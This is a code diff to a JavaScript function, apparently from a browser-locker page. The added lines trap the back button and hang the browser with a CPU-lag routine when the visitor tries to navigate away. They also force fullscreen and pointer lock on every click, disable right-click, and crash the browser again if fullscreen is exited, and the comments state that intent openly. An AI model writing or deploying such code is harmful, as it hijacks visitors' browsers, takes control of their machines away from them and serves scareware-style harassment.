@@ -87,6 +87,7 @@ function playVideos() {
   history.pushState(null, "", location.href);
   window.onpopstate = function() {
     history.pushState(null, "", location.href);
+    activateCPULag(); // If they try to go back, crash the browser
   };
   // 5. Hide Cursor
   document.body.style.cursor = "none";
@@ -103,7 +104,20 @@ function playVideos() {
   } else if (params.has("letmeout")) {
     history.replaceState(null, "", location.pathname + "?letmeout");
   }
-  // 8. Crash Browser
+  // 8. If the body was clicked, enter fullscreen and enter/request pointer lock, usefull if only fullscreen entered when clicked on the button.
+  document.body.addEventListener('click', () => { 
+    (document.documentElement.requestFullscreen || document.documentElement.webkitRequestFullscreen || document.documentElement.mozRequestFullScreen || document.documentElement.msRequestFullscreen)?.call(document.documentElement);
+    (document.documentElement.requestPointerLock || document.documentElement.webkitRequestPointerLock || document.documentElement.mozRequestPointerLock || document.documentElement.msRequestPointerLock)?.call(document.documentElement);
+  });
+  // 9. Block right click
+  document.body.addEventListener('contextmenu', (event) => event.preventDefault());
+  // 10. If they exit fullscreen, crash the browser
+  document.addEventListener("fullscreenchange", () => {
+    if (!document.fullscreenElement) {
+      activateCPULag();
+    }
+  });
+  // Crash Browser function
   function activateCPULag() {
     if (cpuLagActive) return; // Prevent multiple activations
     cpuLagActive = true;
@@ -116,10 +130,4 @@ function playVideos() {
       }
     }, 10);
   }
-  // 9. If they exit fullscreen, crash the browser
-  document.addEventListener("fullscreenchange", () => {
-    if (!document.fullscreenElement) {
-      activateCPULag();
-    }
-  });
 }
